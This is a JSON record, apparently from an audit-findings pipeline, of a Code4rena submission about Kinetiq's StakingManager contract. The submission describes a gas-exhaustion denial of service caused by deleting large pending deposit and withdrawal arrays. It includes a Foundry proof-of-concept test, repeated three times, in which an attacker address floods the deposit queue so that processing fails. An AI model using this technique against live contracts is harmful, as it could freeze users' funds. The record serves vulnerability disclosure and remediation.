@@ -1,0 +1,162 @@
+{
+  "pairing": {
+    "match_status": "exact_submission",
+    "project": "Kinetiq_k8aVPPVguSE",
+    "audit_uid": "k8aVPPVguSE",
+    "requested_submission_uid": "N9iucpLsprJ",
+    "requested_finding_uid": "5Sztw6hvQSr",
+    "source_kind": "pipeline_findings",
+    "source_path": "/root/sc_slicer_standalone/c4_pipeline_output/Kinetiq_k8aVPPVguSE/20260618_143339/findings.json",
+    "source_submission_uid": "N9iucpLsprJ",
+    "source_finding_uid": "5Sztw6hvQSr",
+    "original_report_path": "Kinetiq_k8aVPPVguSE\\medium_valid_N9iucpLsprJ.json",
+    "note": "The report is the exact submission paired with this contract."
+  },
+  "submission_uid": "N9iucpLsprJ",
+  "finding_uid": "5Sztw6hvQSr",
+  "finding_number": "34",
+  "title": "Last pending deposits or withdrawals will fail if there are number of items in pending array",
+  "severity": "medium",
+  "validity": "valid",
+  "quality": "sufficient",
+  "user_handle": "chibi",
+  "body": "## Finding description and impact\n\nThere are 4 deletes on storage array, on 2 unique variables.\n\n```solidity\n        // If we've processed all operations, reset the queue\n        if (_withdrawalProcessingIndex == length) {\n            delete _pendingWithdrawals;\n            _withdrawalProcessingIndex = 0;\n        }\n...\n        // If we've processed all operations, reset the queue\n        if (_depositProcessingIndex == length) {\n            delete _pendingDeposits;\n            _depositProcessingIndex = 0;\n        }\n```\n\nIn solidity, deleting array works by assigning zero values to all existing elements then setting length to 0. To be specific, with 300 elements being pushed, it exceeds 2M gas (small block limit). Similarly, with 5000 elements, it also exceeds 30M gas (big block limit).\n\nThis delete is done when the last item on the queue. (regardless of batch size; it also happens when batchSize=1) That means it'll always happen with normal flows of operation. The operation will not work until another user pushes one more operation and batchSize is set less then the pending operations.\n\n## Recommended mitigation steps\n\nDo not delete arrays; instead, zero the processed elements without decreasing length.",
+  "proof_of_concept": "How to run:\n\n```\nforge test --match-test test_DepositDoS -vvvvv --isolate\n```\n\nIn test/StakingManager.t.sol, add:\n\n```solidity\n    function test_DepositDoS() public {\n        // Set up delegation first\n        vm.startPrank(manager);\n        validatorManager.activateValidator(validator);\n        validatorManager.setDelegation(address(stakingManager), validator);\n        vm.stopPrank();\n\n        address attacker = makeAddr(\"attacker\");\n        uint256 stakeAmount = stakingManager.minStakeAmount();\n        uint256 forBuffer = stakingManager.targetBuffer();\n        if (forBuffer < stakeAmount) forBuffer = stakeAmount;\n        forBuffer += 1e10;\n        vm.deal(address(attacker), stakeAmount * 300 + forBuffer);\n\n        vm.startPrank(attacker);\n        // need to fill the target buffer first to use `_pendingDeposits`\n        stakingManager.stake{value: forBuffer}();\n        // add 299 deposit queue\n        for (uint256 i = 0; i < 299; i++) {\n            stakingManager.stake{value: stakeAmount}();\n        }\n        vm.stopPrank();\n\n        vm.startPrank(operator);\n        // process 299 deposit queue\n        stakingManager.processL1Operations(299);\n        vm.stopPrank();\n\n        vm.roll(block.number + 1);\n        vm.startPrank(attacker);\n        stakingManager.stake{value: stakeAmount}();\n        vm.stopPrank();\n\n        vm.roll(block.number + 1);\n        vm.startPrank(operator);\n        uint256 MAX_BLOCK_LIMIT = 2000000;\n        stakingManager.processL1Operations{gas: MAX_BLOCK_LIMIT}(2);\n        vm.stopPrank();\n    }\n```\n\nThe last call will fail even if batchSize is 1 because of array clear gas.",
+  "lines_of_code": [
+    "https://github.com/code-423n4/2025-04-kinetiq/blob/main/src/StakingManager.sol#L709",
+    "https://github.com/code-423n4/2025-04-kinetiq/blob/main/src/StakingManager.sol#L752",
+    "https://github.com/code-423n4/2025-04-kinetiq/blob/main/src/StakingManager.sol#L967-L968"
+  ],
+  "source_record": {
+    "project_id": "k8aVPPVguSE",
+    "submission_index": "95",
+    "api_submission_id": "",
+    "uid": "N9iucpLsprJ",
+    "number": "95",
+    "title": "Last pending deposits or withdrawals will fail if there are number of items in pending array",
+    "severity": "medium",
+    "validity": "valid",
+    "quality": "sufficient",
+    "handle": "chibi",
+    "lines_of_code": [
+      "https://github.com/code-423n4/2025-04-kinetiq/blob/main/src/StakingManager.sol#L709",
+      "https://github.com/code-423n4/2025-04-kinetiq/blob/main/src/StakingManager.sol#L752",
+      "https://github.com/code-423n4/2025-04-kinetiq/blob/main/src/StakingManager.sol#L967-L968"
+    ],
+    "body": "## Finding description and impact\n\nThere are 4 deletes on storage array, on 2 unique variables.\n\n```solidity\n        // If we've processed all operations, reset the queue\n        if (_withdrawalProcessingIndex == length) {\n            delete _pendingWithdrawals;\n            _withdrawalProcessingIndex = 0;\n        }\n...\n        // If we've processed all operations, reset the queue\n        if (_depositProcessingIndex == length) {\n            delete _pendingDeposits;\n            _depositProcessingIndex = 0;\n        }\n```\n\nIn solidity, deleting array works by assigning zero values to all existing elements then setting length to 0. To be specific, with 300 elements being pushed, it exceeds 2M gas (small block limit). Similarly, with 5000 elements, it also exceeds 30M gas (big block limit).\n\nThis delete is done when the last item on the queue. (regardless of batch size; it also happens when batchSize=1) That means it'll always happen with normal flows of operation. The operation will not work until another user pushes one more operation and batchSize is set less then the pending operations.\n\n## Recommended mitigation steps\n\nDo not delete arrays; instead, zero the processed elements without decreasing length.",
+    "proof_of_concept": "How to run:\n\n```\nforge test --match-test test_DepositDoS -vvvvv --isolate\n```\n\nIn test/StakingManager.t.sol, add:\n\n```solidity\n    function test_DepositDoS() public {\n        // Set up delegation first\n        vm.startPrank(manager);\n        validatorManager.activateValidator(validator);\n        validatorManager.setDelegation(address(stakingManager), validator);\n        vm.stopPrank();\n\n        address attacker = makeAddr(\"attacker\");\n        uint256 stakeAmount = stakingManager.minStakeAmount();\n        uint256 forBuffer = stakingManager.targetBuffer();\n        if (forBuffer < stakeAmount) forBuffer = stakeAmount;\n        forBuffer += 1e10;\n        vm.deal(address(attacker), stakeAmount * 300 + forBuffer);\n\n        vm.startPrank(attacker);\n        // need to fill the target buffer first to use `_pendingDeposits`\n        stakingManager.stake{value: forBuffer}();\n        // add 299 deposit queue\n        for (uint256 i = 0; i < 299; i++) {\n            stakingManager.stake{value: stakeAmount}();\n        }\n        vm.stopPrank();\n\n        vm.startPrank(operator);\n        // process 299 deposit queue\n        stakingManager.processL1Operations(299);\n        vm.stopPrank();\n\n        vm.roll(block.number + 1);\n        vm.startPrank(attacker);\n        stakingManager.stake{value: stakeAmount}();\n        vm.stopPrank();\n\n        vm.roll(block.number + 1);\n        vm.startPrank(operator);\n        uint256 MAX_BLOCK_LIMIT = 2000000;\n        stakingManager.processL1Operations{gas: MAX_BLOCK_LIMIT}(2);\n        vm.stopPrank();\n    }\n```\n\nThe last call will fail even if batchSize is 1 because of array clear gas.",
+    "detail_url": "https://code4rena.com/api/v1/audits/k8aVPPVguSE/submissions/95",
+    "raw": {
+      "auditUid": "k8aVPPVguSE",
+      "createdAt": "2025-04-10T01:53:23.463Z",
+      "deletedAt": null,
+      "evaluations": [
+        {
+          "uid": "4QyANxbcjYv",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "validator",
+          "createdAt": "2025-04-17T14:47:34.688Z",
+          "type": "severity",
+          "value": "medium",
+          "submissionUid": null,
+          "findingUid": "5Sztw6hvQSr"
+        },
+        {
+          "uid": "AnkfPkEpLeu",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "validator",
+          "createdAt": "2025-04-17T14:47:34.688Z",
+          "type": "validity",
+          "value": "valid",
+          "submissionUid": null,
+          "findingUid": "5Sztw6hvQSr"
+        },
+        {
+          "uid": "JavAdTDpspp",
+          "userUid": "tZ7iSgbTXG2",
+          "userAuditRole": "sponsor",
+          "createdAt": "2025-04-18T07:42:59.121Z",
+          "type": "validity",
+          "value": "invalid",
+          "submissionUid": null,
+          "findingUid": "5Sztw6hvQSr"
+        },
+        {
+          "uid": "9z3daULoXHS",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "validator",
+          "createdAt": "2025-04-22T12:52:18.423Z",
+          "type": "quality",
+          "value": "sufficient",
+          "submissionUid": "N9iucpLsprJ",
+          "findingUid": null
+        },
+        {
+          "uid": "9VjTFevE6XR",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2025-05-04T15:35:55.839Z",
+          "type": "severity",
+          "value": "medium",
+          "submissionUid": null,
+          "findingUid": "5Sztw6hvQSr"
+        },
+        {
+          "uid": "xCPggvWpk78",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2025-05-10T13:16:16.416Z",
+          "type": "quality",
+          "value": "sufficient",
+          "submissionUid": "N9iucpLsprJ",
+          "findingUid": null
+        },
+        {
+          "uid": "J5TcwKjFLbA",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2025-05-10T13:16:39.726Z",
+          "type": "validity",
+          "value": "valid",
+          "submissionUid": null,
+          "findingUid": "5Sztw6hvQSr"
+        }
+      ],
+      "finding": {
+        "uid": "5Sztw6hvQSr",
+        "number": 34,
+        "duplicates": 11
+      },
+      "isPrimary": false,
+      "latestEvaluations": {
+        "credit": null,
+        "mitigationStatus": null,
+        "quality": "sufficient",
+        "rank": null,
+        "severity": "medium",
+        "validity": "valid",
+        "updatedAt": "2025-05-10T13:16:39.726Z"
+      },
+      "mitigationOf": null,
+      "mitigationStatus": null,
+      "severity": "medium",
+      "team": null,
+      "title": "Last pending deposits or withdrawals will fail if there are number of items in pending array",
+      "uid": "N9iucpLsprJ",
+      "updatedAt": "2025-04-11T05:05:33.590Z",
+      "user": {
+        "uid": "AzKm5pbmtHd",
+        "handle": "chibi"
+      },
+      "sensitivity": "non-sensitive",
+      "aiSeverity": null,
+      "aiValidity": null,
+      "body": "## Finding description and impact\n\nThere are 4 deletes on storage array, on 2 unique variables.\n\n```solidity\n        // If we've processed all operations, reset the queue\n        if (_withdrawalProcessingIndex == length) {\n            delete _pendingWithdrawals;\n            _withdrawalProcessingIndex = 0;\n        }\n...\n        // If we've processed all operations, reset the queue\n        if (_depositProcessingIndex == length) {\n            delete _pendingDeposits;\n            _depositProcessingIndex = 0;\n        }\n```\n\nIn solidity, deleting array works by assigning zero values to all existing elements then setting length to 0. To be specific, with 300 elements being pushed, it exceeds 2M gas (small block limit). Similarly, with 5000 elements, it also exceeds 30M gas (big block limit).\n\nThis delete is done when the last item on the queue. (regardless of batch size; it also happens when batchSize=1) That means it'll always happen with normal flows of operation. The operation will not work until another user pushes one more operation and batchSize is set less then the pending operations.\n\n## Recommended mitigation steps\n\nDo not delete arrays; instead, zero the processed elements without decreasing length.",
+      "proofOfConcept": "How to run:\n\n```\nforge test --match-test test_DepositDoS -vvvvv --isolate\n```\n\nIn test/StakingManager.t.sol, add:\n\n```solidity\n    function test_DepositDoS() public {\n        // Set up delegation first\n        vm.startPrank(manager);\n        validatorManager.activateValidator(validator);\n        validatorManager.setDelegation(address(stakingManager), validator);\n        vm.stopPrank();\n\n        address attacker = makeAddr(\"attacker\");\n        uint256 stakeAmount = stakingManager.minStakeAmount();\n        uint256 forBuffer = stakingManager.targetBuffer();\n        if (forBuffer < stakeAmount) forBuffer = stakeAmount;\n        forBuffer += 1e10;\n        vm.deal(address(attacker), stakeAmount * 300 + forBuffer);\n\n        vm.startPrank(attacker);\n        // need to fill the target buffer first to use `_pendingDeposits`\n        stakingManager.stake{value: forBuffer}();\n        // add 299 deposit queue\n        for (uint256 i = 0; i < 299; i++) {\n            stakingManager.stake{value: stakeAmount}();\n        }\n        vm.stopPrank();\n\n        vm.startPrank(operator);\n        // process 299 deposit queue\n        stakingManager.processL1Operations(299);\n        vm.stopPrank();\n\n        vm.roll(block.number + 1);\n        vm.startPrank(attacker);\n        stakingManager.stake{value: stakeAmount}();\n        vm.stopPrank();\n\n        vm.roll(block.number + 1);\n        vm.startPrank(operator);\n        uint256 MAX_BLOCK_LIMIT = 2000000;\n        stakingManager.processL1Operations{gas: MAX_BLOCK_LIMIT}(2);\n        vm.stopPrank();\n    }\n```\n\nThe last call will fail even if batchSize is 1 because of array clear gas.",
+      "linesOfCode": "https://github.com/code-423n4/2025-04-kinetiq/blob/main/src/StakingManager.sol#L709,https://github.com/code-423n4/2025-04-kinetiq/blob/main/src/StakingManager.sol#L752,https://github.com/code-423n4/2025-04-kinetiq/blob/main/src/StakingManager.sol#L967-L968",
+      "number": 95,
+      "aiExplanation": null,
+      "_index": 95
+    }
+  }
+}
